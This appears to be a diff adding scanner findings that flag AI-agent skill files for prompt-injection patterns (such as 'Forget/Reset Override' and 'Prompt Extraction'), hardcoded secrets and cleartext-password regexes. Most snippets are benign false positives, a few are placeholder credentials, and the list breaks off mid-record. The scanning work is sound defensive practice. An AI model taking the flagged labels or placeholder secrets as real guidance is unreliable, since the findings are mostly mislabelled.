+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/commands/new-track.md",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Header Injection",
+  "severity": "Severity.CRITICAL",
+  "line": 38,
+  "ctx": "**CRITICAL RULES:**"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/commands/setup.md",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Header Injection",
+  "severity": "Severity.CRITICAL",
+  "line": 37,
+  "ctx": "**CRITICAL RULES:**"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/skills/context-driven-development/references/details.md",
+  "category": "Prompt Injection",
+  "pattern": "Forget/Reset Override",
+  "severity": "Severity.HIGH",
+  "line": 337,
+  "ctx": "### Starting a New Session"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/templates/code_styleguides/dart.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 79,
+  "ctx": "return User.fromJson(jsonDecode(response.body));"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/conductor/templates/code_styleguides/html-css.md",
+  "category": "Prompt Injection",
+  "pattern": "Prompt Chaining Attack",
+  "severity": "Severity.MEDIUM",
+  "line": 324,
+  "ctx": "Step 1: Enter email. Step 2: Verify email. Step 3: Create password."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/content-marketing/agents/search-specialist.md",
+  "category": "Prompt Injection",
+  "pattern": "Academic Framing Bypass",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...ve content - Academic sources for research topics ### WebFetch Deep Dive - Extract full content from promising r..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/data-engineering/commands/data-driven-feature.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Instruction Reset",
+  "severity": "Severity.HIGH",
+  "line": 35,
+  "ctx": "2. Start fresh (archives existing session)"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/deployment-validation/commands/config-validate.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 248,
+  "ctx": "password: \"securepass123\","
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/deployment-validation/commands/config-validate.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 261,
+  "ctx": "password: \"securepass123\","
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/code-review-excellence/references/review-patterns.md",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 175,
+  "ctx": "- [ ] No eval() or similar dynamic execution?"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/error-handling-patterns/references/details.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 240,
+  "ctx": "let mut file = File::open(path)?;  // ? operator propagates e..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/error-handling-patterns/SKILL.md",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...ns across languages including exceptions, Result types, error propagation, and graceful degradation to build resilient applications. Use when implementing er"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/error-handling-patterns/SKILL.md",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...f not order_id: raise ValidationError(\"Order ID is required\") # Fetch order order = db.get_order(order_id) if not order: raise NotFoundError(\"Order\", order_i"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/nx-workspace-patterns/SKILL.md",
+  "category": "Agentic Security",
+  "pattern": "Scope Escape Attempt (ASI10 Precursor)",
+  "severity": "Severity.CRITICAL",
+  "line": 0,
+  "ctx": "...t only what changed - **Don't ignore boundaries** - Tech debt accumulates - *..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/turborepo-caching/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 218,
+  "ctx": "app.listen(3000, \"127.0.0.1\");"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/turborepo-caching/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 233,
+  "ctx": "turbo build --api=\"http://127.0.0.1:3000\" --token=\"my-token\" --te..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/developer-essentials/skills/turborepo-caching/SKILL.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 233,
+  "ctx": "turbo build --api=\"http://127.0.0.1:3000\" --token=\"my-token\" --team=\"my-team\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/dgx-spark-ops/skills/spark-memory-thermal-ops/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Print/Spellcheck Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 147,
+  "ctx": "footprint more directly at long context."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/distributed-debugging/commands/debug-trace.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 203,
+  "ctx": "... this.host = options.host || '0.0.0.0';"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/distributed-debugging/commands/debug-trace.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 289,
+  "ctx": "ENV NODE_OPTIONS=\"--inspect=0.0.0.0:9229\""
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/distributed-debugging/commands/debug-trace.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 290,
+  "ctx": "CMD [\"node\", \"--inspect-brk=0.0.0.0:9229\", \"index.js\"]"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/documentation-generation/agents/tutorial-engineer.md",
+  "category": "Social Engineering",
+  "pattern": "Confidentiality Trap",
+  "severity": "Severity.MEDIUM",
+  "line": 60,
+  "ctx": "- **Show, Don't Tell**: Demonstrate with code, the..."
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/documentation-generation/commands/doc-generate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 92,
+  "ctx": "with open(code_path, 'r') as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/documentation-generation/commands/doc-generate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 130,
+  "ctx": "with open(file_path, 'r') as f:"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/documentation-generation/commands/doc-generate.md",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 635,
+  "ctx": "...           module = ast.parse(open(file_path).read())"
+ },
+ {
+  "repo": "wshobson__agents",
+  "file": "plugins/documentation-generation/skills/changelog-automation/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 116,
+  "ctx": "- **Don't skip validation** - Use commitlint"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/assets/templates/project/.ansible-lint",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 38,
+  "ctx": "# Skip list - rules to skip"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/assets/templates/project/.ansible-lint",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 65,
+  "ctx": "# Warn list - rules to warn but not fail"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/assets/templates/role/molecule/default/molecule.yml",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 3,
+  "ctx": "# Requirements: pip install molecule molecule-plugins[dock..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/assets/templates/role/README.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 36,
+  "ctx": "[role_name]_bind_address: 0.0.0.0"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/best-practices.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 368,
+  "ctx": "hosts_in_network: \"{{ '192.168.1.0/24' | ipaddr('size') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/best-practices.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 369,
+  "ctx": "first_host: \"{{ '192.168.1.0/24' | ipaddr('1') | ipaddr('a..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/best-practices.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 318,
+  "ctx": "password: \"{{ user_password | password_hash('sha512', 'mysecretsalt') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/best-practices.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 449,
+  "ctx": "random_password: \"{{ lookup('password', '/dev/null length=32 chars=ascii_letters,digits') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/best-practices.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 617,
+  "ctx": "password: \"{{ db_password | password_hash('sha512') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 177,
+  "ctx": "line: '192.168.1.100 app.local'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 202,
+  "ctx": "192.168.1.10 web1.local"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 203,
+  "ctx": "192.168.1.11 web2.local"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 204,
+  "ctx": "192.168.1.20 db1.local"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 268,
+  "ctx": "password: \"{{ user_password | password_hash('sha512') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 422,
+  "ctx": "url_password: \"{{ download_password }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1186,
+  "ctx": "master_user_password: \"{{ db_password }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1212,
+  "ctx": "admin_password: \"{{ vm_password }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1342,
+  "ctx": "db_password: \"{{ lookup('community.hashi_vault.hashi_vault', 'secret/data/database:password') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1348,
+  "ctx": "api_key: \"{{ lookup('community.hashi_vault.hashi_vault', 'secret/data/api:key') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1349,
+  "ctx": "api_secret: \"{{ lookup('community.hashi_vault.hashi_vault', 'secret/data/api:secret') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1355,
+  "ctx": "admin_password: \"{{ lookup('community.hashi_vault.hashi_vault', 'secret/data/admin:password', url='https://vault.example.com:8200', auth_method='token', token=v"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1380,
+  "ctx": "api_key: \"{{ lookup('community.aws.aws_secret', 'prod/api/key', version_id='EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/references/module-patterns.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 1394,
+  "ctx": "app_secret: \"{{ lookup('azure.azcollection.azure_keyvault_secret', 'app-secret', vault_url='https://myvault.vault.azure.net') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-generator/test/test_fixture_regressions.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 88,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/best_practices.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 207,
+  "ctx": "db_password: \"{{ database_password | required('database_password must be defined') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/common_errors.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 405,
+  "ctx": "web1 ansible_host=192.168.1.10"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/common_errors.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 407,
+  "ctx": "ansible_host: 192.168.1.11  # YAML syntax in INI file"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/common_errors.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 411,
+  "ctx": "web1 ansible_host=192.168.1.10"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/common_errors.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 412,
+  "ctx": "web2 ansible_host=192.168.1.11"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/common_errors.md",
+  "category": "Prompt Injection",
+  "pattern": "Resource Exhaustion (LLM04)",
+  "severity": "Severity.MEDIUM",
+  "line": 517,
+  "ctx": "...uded/imported file is causing infinite loop"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/common_errors.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 573,
+  "ctx": "**Solution:** Skip check mode for this task"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 309,
+  "ctx": "bind_address: \"0.0.0.0\"  # RISKY: Expose to all"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 336,
+  "ctx": "bind_address: \"127.0.0.1\"  # Localhost only"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 344,
+  "ctx": "src: '10.0.0.0/8'  # Only from internal netw..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 427,
+  "ctx": "...d to specific interfaces, not 0.0.0.0"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 16,
+  "ctx": "password: \"P@ssw0rd123\"  # NEVER DO THIS"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Hardcoded Secret",
+  "severity": "Severity.CRITICAL",
+  "line": 24,
+  "ctx": "api_key: \"sk-1234567890abcdef\"  # NEVER DO THIS"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 24,
+  "ctx": "api_key: \"sk-1234567890abcdef\"  # NEVER DO THIS"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 28,
+  "ctx": "db_password: \"secret123\"  # NEVER DO THIS"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Hardcoded Secret",
+  "severity": "Severity.CRITICAL",
+  "line": 29,
+  "ctx": "aws_secret_key: \"AKIAIOSFODNN7EXAMPLE\"  # NEVER DO THIS"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 39,
+  "ctx": "password: \"{{ admin_password | password_hash('sha512') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 59,
+  "ctx": "db_password: \"{{ lookup('hashi_vault', 'secret=secret/data/db:password') }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/references/security_checklist.md",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 77,
+  "ctx": "db_password: \"{{ vault_db_password }}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/extract_ansible_info.py",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 19,
+  "ctx": "...age\": \"Please install PyYAML: pip install pyyaml\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/extract_ansible_info.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 122,
+  "ctx": "with open(file_path, 'r', encoding='utf-8') as f:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/extract_ansible_info.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 165,
+  "ctx": "with open(req_file, 'r', encoding='utf-8') as f:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/extract_ansible_info_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 34,
+  "ctx": "pip install --quiet pyyaml >&2"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 90,
+  "ctx": "# Look for password: followed by a non-variable value (not ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 91,
+  "ctx": "results=$(grep -n -E \"password:\\s*['\\\"]?[^{'\\\"][^'\\\"]*['\\\"]?\\s*$\"..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 92,
+  "ctx": "...       results+=$(grep -n -E \"password:\\s*['\\\"][^{][^'\\\"]+['\\\"]\" \"$TARGET..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 94,
+  "ctx": "...     results=$(grep -r -n -E \"password:\\s*['\\\"]?[^{'\\\"][^'\\\"]*['\\\"]?\\s*$\"..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 95,
+  "ctx": "...    results+=$(grep -r -n -E \"password:\\s*['\\\"][^{][^'\\\"]+['\\\"]\" \"$TARGET..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 100,
+  "ctx": "...=$(echo \"$results\" | grep -v \"password:\\s*$\" | grep -v \"password:\\s*\\\"\\s*..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 100,
+  "ctx": "...-v \"password:\\s*$\" | grep -v \"password:\\s*\\\"\\s*\\\"\" | grep -v \"password:\\s..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 116,
+  "ctx": "scan_pattern \"password:\\s*['\\\"]\" \"Potential hardcoded pas..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Database Connection String",
+  "severity": "Severity.HIGH",
+  "line": 132,
+  "ctx": "scan_pattern \"mysql://.*:.*@\" \"Potential database connectio..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Database Connection String",
+  "severity": "Severity.HIGH",
+  "line": 133,
+  "ctx": "scan_pattern \"postgres://.*:.*@\" \"Potential database connectio..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Database Connection String",
+  "severity": "Severity.HIGH",
+  "line": 134,
+  "ctx": "scan_pattern \"mongodb://.*:.*@\" \"Potential database connectio..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 144,
+  "ctx": "scan_pattern \"db_password:\\s*['\\\"]\" \"Potential hardcoded dat..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 145,
+  "ctx": "scan_pattern \"database_password:\\s*['\\\"]\" \"Potential hardcoded dat..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 146,
+  "ctx": "scan_pattern \"admin_password:\\s*['\\\"]\" \"Potential hardcoded adm..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/scan_secrets.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 147,
+  "ctx": "scan_pattern \"root_password:\\s*['\\\"]\" \"Potential hardcoded roo..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/setup_tools.sh",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Replay Request",
+  "severity": "Severity.HIGH",
+  "line": 175,
+  "ctx": "echo \"Installation instructions:\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/ansible-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
